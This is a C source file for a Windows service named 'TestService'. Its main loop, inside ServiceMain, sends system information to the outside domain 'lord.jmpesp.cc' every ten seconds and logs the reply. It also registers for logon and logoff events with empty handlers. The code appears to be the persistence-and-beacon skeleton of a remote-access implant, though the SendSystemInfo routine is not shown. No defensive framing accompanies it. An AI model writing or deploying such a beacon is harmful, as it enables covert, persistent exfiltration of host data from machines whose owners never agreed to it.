#include "log.h"
#include "ping.h"
#include <windows.h>
#include <userenv.h>
#include <wtsapi32.h>
#define STARTUPSERVICE "TestService"
SERVICE_STATUS_HANDLE hService = (SERVICE_STATUS_HANDLE)NULL;
SERVICE_STATUS SrvStatus = { 0 };




//VOID WINAPI ServiceHandler(DWORD szControlCode,
DWORD WINAPI ServiceHandler(DWORD szControlCode,
                    DWORD dwEventType,
                    LPVOID lpEventData,
                    LPVOID lpContext) {
    switch(szControlCode) {
    case SERVICE_CONTROL_SESSIONCHANGE:
        switch(dwEventType) {
        case WTS_SESSION_LOGOFF:
            break;
        case WTS_SESSION_LOGON:
            break;
		}
		break;
    case SERVICE_CONTROL_STOP:
        SrvStatus.dwCheckPoint = SrvStatus.dwWaitHint=0;
        SrvStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hService, &SrvStatus);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
		Log("shutdown\n");
        break;
	}
    return 0;
}
VOID WINAPI ServiceMain(DWORD  dwNumServicesArgs, PSTR *ppcServiceArgVectors) {
    hService = RegisterServiceCtrlHandlerExA(STARTUPSERVICE, ServiceHandler, 0);

    SrvStatus.dwServiceType =				SERVICE_WIN32_OWN_PROCESS;
    SrvStatus.dwCheckPoint = 				0;
    SrvStatus.dwServiceSpecificExitCode=	0;
    SrvStatus.dwWaitHint =					0;
    SrvStatus.dwControlsAccepted =			SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SESSIONCHANGE | SERVICE_ACCEPT_SHUTDOWN;
    SrvStatus.dwCurrentState = 				SERVICE_RUNNING;

    SetServiceStatus(hService, &SrvStatus);
	while(TRUE) {
		DWORD ret;
		BYTE bReply[2048]={0};
		ret = SendSystemInfo(/*"192.168.43.5"*/"lord.jmpesp.cc", bReply, sizeof bReply);
		Log("%d %d -> %s\n", ret, GetLastError(), bReply);
		Sleep(10000);
	}

}
int main(void) {
    ZeroMemory(&SrvStatus, sizeof(SrvStatus));
    SERVICE_TABLE_ENTRYA scArrTable[] = {
        { STARTUPSERVICE, ServiceMain },{ NULL, NULL }
    };

    if(StartServiceCtrlDispatcherA(scArrTable) != 0)
		return 1;
    return 0;

}
